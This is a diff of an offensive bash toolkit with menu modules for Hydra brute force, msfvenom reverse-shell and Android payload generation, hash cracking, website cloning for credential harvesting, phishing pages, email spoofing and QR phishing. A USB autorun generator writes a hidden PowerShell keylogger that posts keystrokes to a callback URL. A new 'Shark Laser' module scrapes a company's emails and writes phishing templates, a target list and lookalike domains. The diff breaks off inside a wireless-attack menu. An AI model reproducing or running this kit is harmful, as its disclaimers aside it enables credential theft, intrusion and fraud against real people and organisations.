                 echo -n "Enter password: "
                 read -s bh_pass
                 echo ""
                 bloodhound-python -d "$domain" -u "$bh_user" -p "$bh_pass" -dc "$dc_ip" -c All -o "$blood_dir"
             else
+                [[ "$bh_user" == "99" ]] && return
                 bloodhound-python -d "$domain" -dc "$dc_ip" -c All -o "$blood_dir" --no-pass
             fi
             echo -e "${GREEN}[+] BloodHound data saved to: $blood_dir${NC}"
@@ -998,17 +1284,17 @@ ldap_enum() {
 web_enum() {
     check_install gobuster
     check_install nikto
-    echo -e "${BLUE}[*] Web Enumeration Module${NC}"
-    echo -n "Enter target URL (e.g., http://target.com): "
-    read target
     
+    show_menu "Web Enumeration" "Directory brute forcing and web vulnerability scanning"
+    
+    local target=$(read_input "Enter target URL (e.g., http://target.com): " 1 3 "Web Enumeration")
     [[ -z "$target" ]] && return
+    [[ "$target" == "99" ]] && return
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     local output_dir="$RESULTS_DIR/enumeration/web_$timestamp"
     
-    echo -n "Auto-save results? (y/n): "
-    read auto_save
+    local auto_save=$(read_input "Auto-save results? (y/n): " 2 3 "Web Enumeration")
     
     if [[ "$auto_save" == "y" ]]; then
         create_dir "$output_dir"
@@ -1046,25 +1332,23 @@ web_enum() {
 
 # Subdomain enumeration
 subdomain_enum() {
-    echo -e "${BLUE}[*] Subdomain Enumeration Module${NC}"
-    echo -n "Enter target domain (e.g., example.com): "
-    read domain
+    show_menu "Subdomain Enumeration" "Discover subdomains using various techniques"
     
+    local domain=$(read_input "Enter target domain (e.g., example.com): " 1 2 "Subdomain Enumeration")
     [[ -z "$domain" ]] && return
+    [[ "$domain" == "99" ]] && return
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     
-    echo ""
-    echo -e "${CYAN}=== ENUMERATION METHODS ===${NC}"
-    echo "1) DNS brute force"
-    echo "2) Certificate transparency logs"
-    echo "3) DNS zone transfer attempt"
-    echo "4) All methods"
-    echo "0) Back to main menu"
-    echo -n "Select method: "
-    read method
+    show_menu "Enumeration Methods" "1) DNS brute force
+2) Certificate transparency logs
+3) DNS zone transfer attempt
+4) All methods
+0) Back to main menu"
     
+    local method=$(read_input "Select method: " 2 2 "Subdomain Enumeration")
     [[ "$method" == "0" ]] && return
+    [[ "$method" == "99" ]] && return
     
     local all_results=""
     
@@ -1128,42 +1412,41 @@ subdomain_enum() {
 # Multi-protocol brute force with Hydra
 brute_force() {
     check_install hydra
-    echo -e "${BLUE}[*] Brute Force Module${NC}"
-    echo "Select service:"
-    echo "1) SSH"
-    echo "2) FTP"
-    echo "3) SMB"
-    echo "4) HTTP Basic Auth"
-    echo "5) HTTP Form POST"
-    echo "6) RDP"
-    echo "7) VNC"
-    echo "8) Telnet"
-    echo "0) Back to main menu"
-    echo -n "Choice: "
-    read choice
     
+    show_menu "Brute Force Module" "Select service to attack:
+1) SSH
+2) FTP
+3) SMB
+4) HTTP Basic Auth
+5) HTTP Form POST
+6) RDP
+7) VNC
+8) Telnet
+0) Back to main menu"
+    
+    local choice=$(read_input "Choice: " 1 4 "Brute Force")
     [[ "$choice" == "0" ]] && return
+    [[ "$choice" == "99" ]] && return
     
-    echo -n "Enter target IP: "
-    read target
+    local target=$(read_input "Enter target IP: " 2 4 "Brute Force")
     [[ -z "$target" ]] && return
+    [[ "$target" == "99" ]] && return
     
-    echo -n "Enter username (or 'userlist.txt' for list): "
-    read user
-    echo -n "Use rockyou.txt wordlist? (y/n): "
-    read use_rockyou
+    local user=$(read_input "Enter username (or 'userlist.txt' for list): " 3 4 "Brute Force")
+    [[ "$user" == "99" ]] && return
+    
+    local use_rockyou=$(read_input "Use rockyou.txt wordlist? (y/n): " 4 4 "Brute Force")
     
     if [[ "$use_rockyou" == "y" ]]; then
         wordlist="$WORDLISTS_DIR/rockyou.txt"
     else
-        echo -n "Enter wordlist path: "
-        read wordlist
+        local wordlist=$(read_input "Enter wordlist path: " 5 5 "Brute Force")
+        [[ "$wordlist" == "99" ]] && return
     fi
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     
-    echo -n "Save brute force output? (y/n): "
-    read save_output
+    local save_output=$(read_input "Save brute force output? (y/n): " 6 6 "Brute Force")
     
     local output_file=""
     [[ "$save_output" == "y" ]] && output_file="$RESULTS_DIR/bruteforce/hydra_${target}_$timestamp.txt"
@@ -1196,8 +1479,8 @@ brute_force() {
             fi
             ;;
         4)
-            echo -n "Enter URL path (e.g., /admin): "
-            read path
+            local path=$(read_input "Enter URL path (e.g., /admin): " 7 7 "Brute Force")
+            [[ "$path" == "99" ]] && return
             if [[ -n "$output_file" ]]; then
                 hydra -l "$user" -P "$wordlist" "$target" http-get "$path" -o "$output_file"
                 echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
@@ -1206,14 +1489,14 @@ brute_force() {
             fi
             ;;
         5)
-            echo -n "Enter form path (e.g., /login.php): "
-            read path
-            echo -n "Enter username field name: "
-            read user_field
-            echo -n "Enter password field name: "
-            read pass_field
-            echo -n "Enter failure message (e.g., 'Invalid'): "
-            read fail_msg
+            local path=$(read_input "Enter form path (e.g., /login.php): " 7 7 "Brute Force")
+            [[ "$path" == "99" ]] && return
+            local user_field=$(read_input "Enter username field name: " 8 8 "Brute Force")
+            [[ "$user_field" == "99" ]] && return
+            local pass_field=$(read_input "Enter password field name: " 9 9 "Brute Force")
+            [[ "$pass_field" == "99" ]] && return
+            local fail_msg=$(read_input "Enter failure message (e.g., 'Invalid'): " 10 10 "Brute Force")
+            [[ "$fail_msg" == "99" ]] && return
             if [[ -n "$output_file" ]]; then
                 hydra -l "$user" -P "$wordlist" "$target" http-post-form "$path:$user_field=^USER^&$pass_field=^PASS^:$fail_msg" -o "$output_file"
                 echo -e "${GREEN}[+] Results saved to: $output_file${NC}"
@@ -1258,35 +1541,35 @@ brute_force() {
 # Metasploit payload generator
 payload_gen() {
     check_install metasploit-framework msfvenom
-    echo -e "${BLUE}[*] Payload Generator (msfvenom)${NC}"
-    echo "Select payload type:"
-    echo "1) Linux x86 Reverse Shell"
-    echo "2) Linux x64 Reverse Shell"
-    echo "3) Windows Reverse Shell"
-    echo "4) Windows Meterpreter (Staged)"
-    echo "5) Windows Meterpreter (Stageless)"
-    echo "6) macOS Reverse Shell"
-    echo "7) Python Reverse Shell"
-    echo "8) PHP Reverse Shell"
-    echo "9) ASP.NET Reverse Shell"
-    echo "10) Android APK"
-    echo "11) Custom"
-    echo "0) Back to main menu"
-    echo -n "Choice: "
-    read choice
     
+    show_menu "Payload Generator (msfvenom)" "Select payload type:
+1) Linux x86 Reverse Shell
+2) Linux x64 Reverse Shell
+3) Windows Reverse Shell
+4) Windows Meterpreter (Staged)
+5) Windows Meterpreter (Stageless)
+6) macOS Reverse Shell
+7) Python Reverse Shell
+8) PHP Reverse Shell
+9) ASP.NET Reverse Shell
+10) Android APK
+11) Custom
+0) Back to main menu"
+    
+    local choice=$(read_input "Choice: " 1 4 "Payload Gen")
     [[ "$choice" == "0" ]] && return
+    [[ "$choice" == "99" ]] && return
     
-    echo -n "Enter LHOST (your IP): "
-    read lhost
+    local lhost=$(read_input "Enter LHOST (your IP): " 2 4 "Payload Gen")
     [[ -z "$lhost" ]] && return
+    [[ "$lhost" == "99" ]] && return
     
-    echo -n "Enter LPORT: "
-    read lport
-    echo -n "Enter output filename: "
-    read filename
+    local lport=$(read_input "Enter LPORT: " 3 4 "Payload Gen")
+    [[ "$lport" == "99" ]] && return
     
+    local filename=$(read_input "Enter output filename: " 4 4 "Payload Gen")
     [[ -z "$filename" ]] && return
+    [[ "$filename" == "99" ]] && return
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     local output_path="$TROJANS_DIR/${timestamp}_$filename"
@@ -1323,10 +1606,10 @@ payload_gen() {
             msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" -o "$output_path"
             ;;
         11)
-            echo -n "Enter msfvenom payload name: "
-            read payload
-            echo -n "Enter format (elf/exe/python/psh/macho/raw): "
-            read format
+            local payload=$(read_input "Enter msfvenom payload name: " 5 5 "Payload Gen")
+            [[ "$payload" == "99" ]] && return
+            local format=$(read_input "Enter format (elf/exe/python/psh/macho/raw): " 6 6 "Payload Gen")
+            [[ "$format" == "99" ]] && return
             msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f "$format" -o "$output_path"
             ;;
     esac
@@ -1346,16 +1629,16 @@ payload_gen() {
 # Exploit search and information
 exploit_search() {
     check_install metasploit-framework searchsploit
-    echo -e "${BLUE}[*] Exploit Database Search${NC}"
-    echo -n "Enter search term (service/version): "
-    read term
     
+    show_menu "Exploit Database Search" "Search for exploits by service/version"
+    
+    local term=$(read_input "Enter search term (service/version): " 1 3 "Exploit Search")
     [[ -z "$term" ]] && return
+    [[ "$term" == "99" ]] && return
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     
-    echo -n "Save search results? (y/n): "
-    read save_results
+    local save_results=$(read_input "Save search results? (y/n): " 2 3 "Exploit Search")
     
     if [[ "$save_results" == "y" ]]; then
         local output_file="$RESULTS_DIR/exploitation/searchsploit_$timestamp.txt"
@@ -1365,9 +1648,8 @@ exploit_search() {
         searchsploit "$term"
     fi
     
-    echo -n "View details of exploit? (enter ID or n): "
-    read exploit_id
-    if [[ "$exploit_id" != "n" && "$exploit_id" != "N" ]]; then
+    local exploit_id=$(read_input "View details of exploit? (enter ID or n): " 3 3 "Exploit Search")
+    if [[ "$exploit_id" != "n" && "$exploit_id" != "N" && "$exploit_id" != "99" ]]; then
         searchsploit -x "$exploit_id"
     fi
     
@@ -1381,25 +1663,22 @@ exploit_search() {
 
 # Hash cracking with John or Hashcat
 password_crack() {
-    echo -e "${BLUE}[*] Password Cracking Module${NC}"
-    echo "1) John the Ripper"
-    echo "2) Hashcat"
-    echo "3) Identify hash type"
-    echo "0) Back to main menu"
-    echo -n "Choice: "
-    read choice
+    show_menu "Password Cracking Module" "1) John the Ripper
+2) Hashcat
+3) Identify hash type
+0) Back to main menu"
     
+    local choice=$(read_input "Choice: " 1 3 "Password Crack")
     [[ "$choice" == "0" ]] && return
+    [[ "$choice" == "99" ]] && return
     
-    echo -n "Enter hash file path: "
-    read hashfile
-    
+    local hashfile=$(read_input "Enter hash file path: " 2 3 "Password Crack")
     [[ -z "$hashfile" ]] && return
+    [[ "$hashfile" == "99" ]] && return
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     
-    echo -n "Save cracking output? (y/n): "
-    read save_output
+    local save_output=$(read_input "Save cracking output? (y/n): " 3 3 "Password Crack")
     
     local output_file=""
     [[ "$save_output" == "y" ]] && output_file="$RESULTS_DIR/cracking/crack_$timestamp.txt"
@@ -1407,8 +1686,8 @@ password_crack() {
     case $choice in
         1)
             check_install john
-            echo -n "Enter hash format (or 'auto'): "
-            read format
+            local format=$(read_input "Enter hash format (or 'auto'): " 4 4 "Password Crack")
+            [[ "$format" == "99" ]] && return
             
             if [[ -n "$output_file" ]]; then
                 if [[ "$format" == "auto" ]]; then
@@ -1429,8 +1708,8 @@ password_crack() {
             ;;
         2)
             check_install hashcat
-            echo -n "Enter hash mode number (0 for MD5, 100 for SHA1, etc): "
-            read mode
+            local mode=$(read_input "Enter hash mode number (0 for MD5, 100 for SHA1, etc): " 4 4 "Password Crack")
+            [[ "$mode" == "99" ]] && return
             
             if [[ -n "$output_file" ]]; then
                 hashcat -m "$mode" "$hashfile" "$WORDLISTS_DIR/rockyou.txt" --force -o "$output_file"
@@ -1458,24 +1737,17 @@ password_crack() {
 # Phishing campaign manager
 phishing_menu() {
     while true; do
-        echo -e "${CYAN}"
-        cat << "EOF"
-    ╔═══════════════════════════════════════════════════════════╗
-    ║              PHISHING & SOCIAL ENGINEERING                ║
-    ╚═══════════════════════════════════════════════════════════╝
-EOF
-        echo -e "${NC}"
+        show_menu "Phishing & Social Engineering" "1) Clone Website (Credential Harvester)
+2) Create Custom Phishing Page
+3) Email Spoofing/Sender
+4) View Captured Credentials
+5) Generate QR Code Phish
+6) USB Drop Attack Generator
+7) Web Scrape Email Phishing (Shark Laser)
+8) Terminal Wireshark Capture
+0) Back to Main Menu"
         
-        echo "1) Clone Website (Credential Harvester)"
-        echo "2) Create Custom Phishing Page"
-        echo "3) Email Spoofing/Sender"
-        echo "4) View Captured Credentials"
-        echo "5) Generate QR Code Phish"
-        echo "6) USB Drop Attack Generator"
-        echo "0) Back to Main Menu"
-        echo ""
-        echo -n "Select option: "
-        read phish_choice
+        local phish_choice=$(read_input "Select option: " 1 2 "Phishing Menu")
         
         case $phish_choice in
             1) clone_website ;;
@@ -1484,6 +1756,8 @@ EOF
             4) view_captured_creds ;;
             5) qr_code_phish ;;
             6) usb_drop_generator ;;
+            7) web_scrape_phish ;;
+            8) wireshark_terminal ;;
             0) break ;;
             *) echo -e "${RED}Invalid option${NC}"; sleep 1 ;;
         esac
@@ -1493,14 +1767,15 @@ EOF
 # Website cloning for credential harvesting
 clone_website() {
     check_install httrack
-    echo -e "${BLUE}[*] Website Cloning Tool${NC}"
-    echo -n "Enter target URL to clone (e.g., https://login.microsoftonline.com): "
-    read target_url
     
+    show_menu "Website Cloning Tool" "Clone a website for credential harvesting"
+    
+    local target_url=$(read_input "Enter target URL to clone (e.g., https://login.microsoftonline.com): " 1 3 "Clone Website")
     [[ -z "$target_url" ]] && return
+    [[ "$target_url" == "99" ]] && return
     
-    echo -n "Enter local port for harvester (default 8080): "
-    read harvest_port
+    local harvest_port=$(read_input "Enter local port for harvester (default 8080): " 2 3 "Clone Website")
+    [[ "$harvest_port" == "99" ]] && return
     harvest_port=${harvest_port:-8080}
     
     timestamp=$(date +%Y%m%d_%H%M%S)
@@ -1515,8 +1790,7 @@ clone_website() {
     
     if [[ -n "$login_file" ]]; then
         echo -e "${GREEN}[+] Found potential login page: $login_file${NC}"
-        echo -n "Modify form to capture credentials? (y/n): "
-        read modify_form
+        local modify_form=$(read_input "Modify form to capture credentials? (y/n): " 3 3 "Clone Website")
         
         if [[ "$modify_form" == "y" ]]; then
             # Create PHP capture script
@@ -1559,23 +1833,22 @@ PHPEOF
 
 # Custom phishing page generator
 custom_phish_page() {
-    echo -e "${BLUE}[*] Custom Phishing Page Generator${NC}"
+    show_menu "Custom Phishing Page Generator" "Create a custom phishing login page"
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     local template_dir="$PHISHING_DIR/templates/custom_$timestamp"
     create_dir "$template_dir"
     
-    echo "Select template type:"
-    echo "1) Corporate Login"
-    echo "2) Social Media Login"
-    echo "3) Banking Login"
-    echo "4) Email Login"
-    echo "5) Custom HTML"
-    echo "0) Back to main menu"
-    echo -n "Choice: "
-    read template_choice
+    show_menu "Template Type" "1) Corporate Login
+2) Social Media Login
+3) Banking Login
+4) Email Login
+5) Custom HTML
+0) Back to main menu"
     
+    local template_choice=$(read_input "Choice: " 1 4 "Custom Phish")
     [[ "$template_choice" == "0" ]] && return
+    [[ "$template_choice" == "99" ]] && return
     
     case $template_choice in
         1) template_name="Corporate Portal" ;;
@@ -1585,12 +1858,14 @@ custom_phish_page() {
         5) template_name="Custom" ;;
     esac
     
-    echo -n "Enter page title: "
-    read page_title
-    echo -n "Enter company/logo name: "
-    read company_name
-    echo -n "Enter redirect URL (after capture): "
-    read redirect_url
+    local page_title=$(read_input "Enter page title: " 2 4 "Custom Phish")
+    [[ "$page_title" == "99" ]] && return
+    
+    local company_name=$(read_input "Enter company/logo name: " 3 4 "Custom Phish")
+    [[ "$company_name" == "99" ]] && return
+    
+    local redirect_url=$(read_input "Enter redirect URL (after capture): " 4 4 "Custom Phish")
+    [[ "$redirect_url" == "99" ]] && return
     
     # Generate HTML
     cat > "$template_dir/index.html" << EOF
@@ -1634,8 +1909,8 @@ header('Location: $redirect_url');
 ?>
 EOF
 
-    echo -n "Enter port to serve on (default 8080): "
-    read serve_port
+    local serve_port=$(read_input "Enter port to serve on (default 8080): " 5 5 "Custom Phish")
+    [[ "$serve_port" == "99" ]] && return
     serve_port=${serve_port:-8080}
     
     echo -e "${GREEN}[+] Phishing page created in: $template_dir${NC}"
@@ -1645,25 +1920,245 @@ EOF
     cd "$template_dir" && php -S "0.0.0.0:$serve_port"
 }
 
+# Web scraping email phishing - LEGAL implementation
+web_scrape_phish() {
+    show_menu "Web Scrape Email Phishing (Shark Laser)" "LEGAL USE ONLY - For authorized penetration testing
+This tool scrapes publicly available emails from websites
+and generates phishing email templates."
+    
+    echo -e "${YELLOW}[*] This tool performs LEGAL web scraping of publicly available data only.${NC}"
+    echo -e "${YELLOW}[*] It does NOT send emails - only generates templates.${NC}"
+    echo ""
+    
+    local target_url=$(read_input "Enter target website URL (e.g., https://company.com/about): " 1 4 "Web Scrape Phish")
+    [[ -z "$target_url" ]] && return
+    [[ "$target_url" == "99" ]] && return
+    
+    local target_name=$(read_input "Enter target company name: " 2 4 "Web Scrape Phish")
+    [[ -z "$target_name" ]] && return
+    [[ "$target_name" == "99" ]] && return
+    
+    timestamp=$(date +%Y%m%d_%H%M%S)
+    local output_dir="$PHISHING_DIR/shark_laser_$timestamp"
+    create_dir "$output_dir"
+    
+    echo -e "${YELLOW}[*] Scraping website for email addresses...${NC}"
+    echo -e "${CYAN}[*] Target: $target_url${NC}"
+    
+    # Download the webpage
+    local temp_file="/tmp/shark_laser_$(date +%s).html"
+    curl -s -L -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
+         --connect-timeout 10 --max-time 30 \
+         "$target_url" -o "$temp_file" 2>/dev/null
+    
+    if [[ ! -f "$temp_file" ]]; then
+        echo -e "${RED}[!] Failed to download webpage${NC}"
+        return
+    fi
+    
+    # Extract emails using regex (legal - public data)
+    echo -e "${YELLOW}[*] Extracting email addresses...${NC}"
+    local emails=$(grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' "$temp_file" | sort -u)
+    
+    # Also try common patterns
+    local obfuscated=$(grep -oE '[a-zA-Z0-9._%+-]+\s*\[at\]\s*[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' "$temp_file | sed 's/\[at\]/@/g' | sort -u")
+    
+    # Combine results
+    local all_emails=$(echo -e "$emails\n$obfuscated" | grep -v "^$" | sort -u)
+    
+    # Save found emails
+    echo "$all_emails" > "$output_dir/discovered_emails.txt"
+    
+    local email_count=$(echo "$all_emails" | grep -c "@" || echo "0")
+    echo -e "${GREEN}[+] Found $email_count email address(es)${NC}"
+    
+    # Extract company info for realistic template
+    echo -e "${YELLOW}[*] Analyzing website content...${NC}"
+    local page_title=$(grep -oE '<title>[^<]+</title>' "$temp_file" | sed 's/<[^>]*>//g' | head -1)
+    local meta_desc=$(grep -oE 'meta name="description" content="[^"]+"' "$temp_file" | sed 's/.*content="\([^"]*\)".*/\1/' | head -1)
+    
+    # Generate phishing templates
+    echo -e "${YELLOW}[*] Generating phishing email templates...${NC}"
+    
+    # Template 1: Password Reset
+    cat > "$output_dir/template_password_reset.txt" << EOF
+Subject: Urgent: Password Reset Required - $target_name
+
+Dear [EMPLOYEE_NAME],
+
+Our security system has detected unusual activity on your $target_name account. 
+As a precautionary measure, we require all employees to verify their account 
+credentials immediately.
+
+Please click the link below to reset your password:
+[PHISHING_LINK]
+
+This link will expire in 24 hours. Failure to verify your account may result 
+in temporary suspension of access to company resources.
+
+Best regards,
+$target_name IT Security Team
+---
+
+DISCLAIMER: This is a simulated phishing template for authorized security testing only.
+Do NOT use for unauthorized purposes. Legal penalties may apply for misuse.
+EOF
+
+    # Template 2: Document Share
+    cat > "$output_dir/template_document_share.txt" << EOF
+Subject: Shared Document: Q4 Financial Review - Action Required
+
+Hi [EMPLOYEE_NAME],
+
+I've shared a confidential document with you regarding the upcoming Q4 financial review.
+Please review and provide your feedback by end of day.
+
+Access the document here:
+[PHISHING_LINK]
+
+Note: This is an encrypted document. You'll need to sign in with your 
+corporate credentials to view it.
+
+Thanks,
+[FAKE_SENDER_NAME]
+$target_name Finance Department
+---
+
+DISCLAIMER: This is a simulated phishing template for authorized security testing only.
+Do NOT use for unauthorized purposes. Legal penalties may apply for misuse.
+EOF
+
+    # Template 3: IT Update
+    cat > "$output_dir/template_it_update.txt" << EOF
+Subject: IMPORTANT: Email System Migration - Verify Your Account
+
+Dear $target_name Employee,
+
+We are migrating our email system to a new secure platform this week.
+All employees must verify their email credentials to ensure uninterrupted service.
+
+Please verify your account here:
+[PHISHING_LINK]
+
+The migration will take place on $(date +%B) $(date +%d), $(date +%Y).
+Accounts not verified by this date will be temporarily disabled.
+
+Technical Support
+$target_name IT Department
+Phone: [FAKE_PHONE]
+---
+
+DISCLAIMER: This is a simulated phishing template for authorized security testing only.
+Do NOT use for unauthorized purposes. Legal penalties may apply for misuse.
+EOF
+
+    # Generate target list with discovered emails
+    cat > "$output_dir/target_list.txt" << EOF
+# Shark Laser Phishing Target List
+# Generated: $(date)
+# Source: $target_url
+# Legal Notice: For authorized testing only
+
+TARGET_COMPANY: $target_name
+EMAILS_FOUND: $email_count
+
+# Discovered Email Addresses:
+$all_emails
+
+# Instructions:
+# 1. Replace [PHISHING_LINK] with your credential harvester URL
+# 2. Replace [EMPLOYEE_NAME] with actual names (from LinkedIn, etc.)
+# 3. Customize templates based on reconnaissance
+# 4. Test ONLY with explicit written authorization
+
+# Suggested phishing domain:
+# $(echo "$target_name" | tr '[:upper:]' '[:lower:]' | tr ' ' '-')-secure.com
+# $(echo "$target_name" | tr '[:upper:]' '[:lower:]' | tr ' ' '-')-login.com
+EOF
+
+    # Create a summary report
+    cat > "$output_dir/SHARK_LASER_REPORT.txt" << EOF
+╔═══════════════════════════════════════════════════════════╗
+║              SHARK LASER PHISHING REPORT                  ║
+╚═══════════════════════════════════════════════════════════╝
+
+Target: $target_name
+Source URL: $target_url
+Scan Date: $(date)
+Report ID: $timestamp
+
+=== DISCOVERED EMAILS ($email_count) ===
+$all_emails
+
+=== WEBSITE INTELLIGENCE ===
+Page Title: $page_title
+Description: $meta_desc
+
+=== GENERATED FILES ===
+- discovered_emails.txt: Raw email list
+- target_list.txt: Formatted target list with instructions
+- template_password_reset.txt: Password reset phishing template
+- template_document_share.txt: Document share phishing template
+- template_it_update.txt: IT update phishing template
+
+=== LEGAL DISCLAIMER ===
+This report was generated using LEGAL web scraping techniques on publicly 
+available data. The email addresses were found on publicly accessible web pages.
+
+The phishing templates are for AUTHORIZED security testing only.
+Using these templates without explicit permission is illegal and unethical.
+
+Always obtain written authorization before conducting phishing simulations.
+
+=== NEXT STEPS ===
+1. Review discovered emails for validity
+2. Select appropriate template
+3. Customize template with target-specific details
+4. Set up credential harvester (clone_website function)
+5. Send test to yourself first
+6. Conduct authorized campaign
+
+Report saved to: $output_dir/
+EOF
+
+    echo ""
+    echo -e "${GREEN}[+] Shark Laser report generated!${NC}"
+    echo -e "${CYAN}[*] Location: $output_dir/${NC}"
+    echo ""
+    cat "$output_dir/SHARK_LASER_REPORT.txt"
+    
+    # Cleanup
+    rm -f "$temp_file"
+    
+    echo ""
+    echo -n "Press Enter to continue..."
+    read
+}
+
 # Email spoofing tool
 email_spoofer() {
     check_install sendemail
-    echo -e "${BLUE}[*] Email Spoofing/Sending Tool${NC}"
+    
+    show_menu "Email Spoofing/Sending Tool" "WARNING: Only use for authorized testing!"
+    
     echo -e "${RED}[!] WARNING: Only use for authorized testing!${NC}"
     echo ""
     
-    echo -n "SMTP server (IP:port): "
-    read smtp_server
+    local smtp_server=$(read_input "SMTP server (IP:port): " 1 6 "Email Spoof")
     [[ -z "$smtp_server" ]] && return
+    [[ "$smtp_server" == "99" ]] && return
     
-    echo -n "From address (can be spoofed): "
-    read from_addr
-    echo -n "To address: "
-    read to_addr
-    echo -n "Subject: "
-    read subject
-    echo -n "Message body (or path to HTML file): "
-    read body
+    local from_addr=$(read_input "From address (can be spoofed): " 2 6 "Email Spoof")
+    [[ "$from_addr" == "99" ]] && return
+    
+    local to_addr=$(read_input "To address: " 3 6 "Email Spoof")
+    [[ "$to_addr" == "99" ]] && return
+    
+    local subject=$(read_input "Subject: " 4 6 "Email Spoof")
+    [[ "$subject" == "99" ]] && return
+    
+    local body=$(read_input "Message body (or path to HTML file): " 5 6 "Email Spoof")
+    [[ "$body" == "99" ]] && return
     
     # Check if body is a file
     if [[ -f "$body" ]]; then
@@ -1672,12 +2167,11 @@ email_spoofer() {
         body_arg="-u \"$body\""
     fi
     
-    echo -n "Attachment file (optional, press Enter to skip): "
-    read attachment
+    local attachment=$(read_input "Attachment file (optional, press Enter to skip): " 6 6 "Email Spoof")
+    [[ "$attachment" == "99" ]] && return
     [[ -n "$attachment" ]] && attach_arg="-a \"$attachment\"" || attach_arg=""
     
-    echo -n "Use TLS/SSL? (y/n): "
-    read use_tls
+    local use_tls=$(read_input "Use TLS/SSL? (y/n): " 7 7 "Email Spoof")
     [[ "$use_tls" == "y" ]] && tls_arg="-tls=yes" || tls_arg=""
     
     echo -e "${YELLOW}[*] Sending email...${NC}"
@@ -1689,8 +2183,7 @@ email_spoofer() {
 
 # View captured credentials
 view_captured_creds() {
-    echo -e "${BLUE}[*] Captured Credentials Database${NC}"
-    echo ""
+    show_menu "Captured Credentials Database" "View harvested credentials from phishing campaigns"
     
     # List all captured credential files
     local cred_files=()
@@ -1709,8 +2202,7 @@ view_captured_creds() {
         done
         
         echo ""
-        echo -n "View file number (or 'all'): "
-        read view_choice
+        local view_choice=$(read_input "View file number (or 'all'): " 1 2 "View Creds")
         
         if [[ "$view_choice" == "all" ]]; then
             for file in "${cred_files[@]}"; do
@@ -1723,8 +2215,7 @@ view_captured_creds() {
     fi
     
     echo ""
-    echo -n "Export to single file? (y/n): "
-    read export_creds
+    local export_creds=$(read_input "Export to single file? (y/n): " 2 2 "View Creds")
     if [[ "$export_creds" == "y" ]]; then
         local export_file="$CREDS_DIR/all_creds_$(date +%Y%m%d).txt"
         cat "${cred_files[@]}" 2>/dev/null > "$export_file"
@@ -1737,14 +2228,15 @@ view_captured_creds() {
 
 # QR Code phishing generator
 qr_code_phish() {
-    echo -e "${BLUE}[*] QR Code Phishing Generator${NC}"
-    echo -n "Enter malicious URL: "
-    read malicious_url
+    show_menu "QR Code Phishing Generator" "Create malicious QR codes for phishing"
     
+    local malicious_url=$(read_input "Enter malicious URL: " 1 3 "QR Phish")
     [[ -z "$malicious_url" ]] && return
+    [[ "$malicious_url" == "99" ]] && return
     
-    echo -n "Output filename (without extension): "
-    read qr_filename
+    local qr_filename=$(read_input "Output filename (without extension): " 2 3 "QR Phish")
+    [[ -z "$qr_filename" ]] && return
+    [[ "$qr_filename" == "99" ]] && return
     
     timestamp=$(date +%Y%m%d_%H%M%S)
     
@@ -1771,7 +2263,8 @@ img.save('$PHISHING_DIR/${qr_filename}.png')
 
 # USB drop attack generator
 usb_drop_generator() {
-    echo -e "${BLUE}[*] USB Drop Attack Generator${NC}"
+    show_menu "USB Drop Attack Generator" "Creates autorun payloads for USB devices"
+    
     echo -e "${YELLOW}[*] Creates autorun payloads for USB devices${NC}"
     echo ""
     
@@ -1779,24 +2272,24 @@ usb_drop_generator() {
     local usb_dir="$PHISHING_DIR/usb_payloads_$timestamp"
     create_dir "$usb_dir"
     
-    echo "Select payload type:"
-    echo "1) Reverse shell (PowerShell)"
-    echo "2) Credential harvester"
-    echo "3) Keylogger dropper"
-    echo "4) Custom batch script"
-    echo "0) Back to main menu"
-    echo -n "Choice: "
-    read usb_choice
+    show_menu "Payload Type" "1) Reverse shell (PowerShell)
+2) Credential harvester
+3) Keylogger dropper
+4) Custom batch script
+0) Back to main menu"
     
+    local usb_choice=$(read_input "Choice: " 1 2 "USB Drop")
     [[ "$usb_choice" == "0" ]] && return
+    [[ "$usb_choice" == "99" ]] && return
     
     case $usb_choice in
         1)
-            echo -n "Enter LHOST: "
-            read lhost
+            local lhost=$(read_input "Enter LHOST: " 2 2 "USB Drop")
             [[ -z "$lhost" ]] && return
-            echo -n "Enter LPORT: "
-            read lport
+            [[ "$lhost" == "99" ]] && return
+            
+            local lport=$(read_input "Enter LPORT: " 3 3 "USB Drop")
+            [[ "$lport" == "99" ]] && return
             
             cat > "$usb_dir/autorun.bat" << EOF
 @echo off
@@ -1811,17 +2304,17 @@ EOF
             create_dir "$usb_dir/captured"
             ;;
         3)
-            echo -n "Enter callback URL for logs: "
-            read callback_url
+            local callback_url=$(read_input "Enter callback URL for logs: " 2 2 "USB Drop")
             [[ -z "$callback_url" ]] && return
+            [[ "$callback_url" == "99" ]] && return
+            
             cat > "$usb_dir/autorun.bat" << EOF
 @echo off
 powershell -WindowStyle Hidden -Command "Add-Type -AssemblyName System.Windows.Forms; \$keys = ''; while(\$true){ Start-Sleep -m 10; for(\$i=1; \$i -le 254; \$i++){\$key = [System.Windows.Forms.SendKeys]::GetAsyncKeyState(\$i); if(\$key -eq -32767){\$keys += [char]\$i; if(\$keys.Length -gt 100){ Invoke-WebRequest -Uri '$callback_url' -Method POST -Body \$keys; \$keys = ''}}}}"
 EOF
             ;;
         4)
-            echo -n "Enter path to custom batch file: "
-            read custom_batch
+            local custom_batch=$(read_input "Enter path to custom batch file: " 2 2 "USB Drop")
             [[ -f "$custom_batch" ]] && cp "$custom_batch" "$usb_dir/autorun.bat"
             ;;
     esac
@@ -1861,26 +2354,17 @@ wifi_attacks() {
     check_install wireless-tools
     
     while true; do
-        echo -e "${CYAN}"
-        cat << "EOF"
-    ╔═══════════════════════════════════════════════════════════╗
-    ║              WIRELESS ATTACKS MODULE                      ║
-    ╚═══════════════════════════════════════════════════════════╝
-EOF
-        echo -e "${NC}"
+        show_menu "Wireless Attacks Module" "1) Scan for wireless networks
+2) Capture WPA/WPA2 handshake
+3) Crack WPA/WPA2 handshake
+4) WPS PIN attack (Reaver)
+5) Deauth attack
